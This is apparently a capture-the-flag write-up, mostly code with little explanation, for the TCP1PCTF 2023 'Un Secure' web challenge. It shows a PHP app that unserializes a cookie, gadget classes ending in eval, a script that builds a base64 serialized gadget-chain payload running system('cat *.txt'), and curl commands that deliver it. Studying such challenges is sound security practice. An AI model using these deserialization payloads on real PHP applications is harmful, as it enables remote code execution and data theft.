# TCP1PCTF 2023 – Un Secure [WEB]

> 原文: https://www.ctfiot.com/139455.html
> ID: 139455


```
1
2
3
4
5
6
7
8
9
```



```
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
 $cookie = base64_decode($_COOKIE['cookie']);
 unserialize($cookie);
}

echo "Welcome to my web app!";
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
```



```
<?php

namespace GadgetOne {
 class Adders
 {
 private $x;
 function __construct($x)
 {
 $this->x = $x;
 }
 function get_x()
 {
 return $this->x;
 }
 }
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
```



```
<?php
namespace GadgetTwo {
 class Echoers
 {
 protected $klass;
 function __destruct()
 {
 echo $this->klass->get_x();
 }
 }

}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
```



```
<?php

namespace GadgetThree {
 class Vuln
 {
 public $waf1;
 protected $waf2;
 private $waf3;
 public $cmd;
 function __toString()
 {
 if (!($this->waf1 === 1)) {
 die("not x");
 }
 if (!($this->waf2 === "\xde\xad\xbe\xef")) {
 die("not y");
 }
 if (!($this->waf3) === false) {
 die("not z");
 }
 eval($this->cmd);
 }
 }
}
```



```
1
```



```
unserialize($cookie);
```



```
1
2
3
4
5
```



```
# Original
echo $this->klass->get_x();

# Plan
echo $this->klass->Vuln();
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
```



```
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(1);
$gadgetTwo = new \GadgetTwo\Echoers();
$gadgetThree = new \GadgetThree\Vuln();

// Setup GadgeThree
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln, 1);
$property = $reflection->getProperty('waf2');
$property->setAccessible(true);
$property->setValue($vuln, "\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setAccessible(true);
$property->setValue($vuln, false);
$property = $reflection->getProperty('cmd');
$property->setAccessible(true);
$property->setValue($vuln, "system('cat *.txt');");

// Setup GadgetOne
// __construct($x)
$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection->getProperty('x');
$property->setAccessible(true);
$property->setValue($adders, $vuln);

// Setup GadgetTwo
// __destruct()
$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($echoers, $adders);

$serialized = serialize($echoers);

echo base64_encode($serialized);

echo "\n";
```



```
1
```



```
curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0="
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
```



```
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(system('id'));
$gadgetTwo = new \GadgetTwo\Echoers();

$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($gadgetTwo, $gadgetOne);

$serializedGadgetTwo = serialize($gadgetTwo);

echo(base64_encode($serializedGadgetTwo));
```



```
1
```



```
curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0="
```



```
1
2
3
4
5
```



```
# Base64 Encoded Bbject
TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=

# Base64 Decoded Object
O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
```
